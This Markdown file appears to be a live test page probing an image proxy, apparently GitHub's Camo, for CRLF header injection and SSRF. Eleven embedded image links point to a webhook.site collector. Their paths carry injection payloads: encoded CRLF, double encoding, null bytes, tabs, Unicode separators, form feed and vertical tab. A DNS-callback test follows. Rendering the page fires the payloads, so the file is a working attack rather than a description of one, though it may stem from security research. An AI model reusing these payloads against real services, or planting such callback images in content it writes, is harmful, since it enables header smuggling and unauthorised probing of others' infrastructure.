# SSRF Verification Test - v15

This test verifies whether CRLF injection actually works by checking if the injected X-Injected-Test header appears in the request.

## Test 1: Baseline (no injection)
![baseline](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/baseline-test.gif)

## Test 2: CRLF Header Injection Attempt
If Camo is vulnerable, the X-Injected-Test header should appear in webhook.site's received headers.

![inject1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%0d%0aX-Injected-Test:%20VULNERABLE%0d%0a.gif)

## Test 3: Double URL Encoding
![inject2](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%250d%250aX-Double-Encoded:%20TEST%250d%250a.gif)

## Test 4: Mixed Encoding
![inject3](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%0d%0aX-Test-Header:%20value1%250d%250aX-Second:%20value2.gif)

## Test 5: Null Byte Injection
![null1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%00X-Null-Header:%20test.gif)

## Test 6: Tab Character
![tab1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%09X-Tab-Header:%20test.gif)

## Test 7: Space in Path
![space1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%20HTTP/1.1%0d%0aHost:%20evil.gif)

## Test 8: Unicode Line Separator
![unicode1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%E2%80%A8X-Unicode-Line:%20test.gif)

## Test 9: Unicode Paragraph Separator  
![unicode2](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%E2%80%A9X-Unicode-Para:%20test.gif)

## Test 10: Form Feed Character
![ff1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%0cX-FF-Header:%20test.gif)

## Test 11: Vertical Tab
![vt1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%0bX-VT-Header:%20test.gif)

## DNS Tests
![dns1](https://8af69f3d-bfff-4a34-b04d-96a28e1e0e47.dnshook.site/test.gif)

Version 15 - Header Injection Verification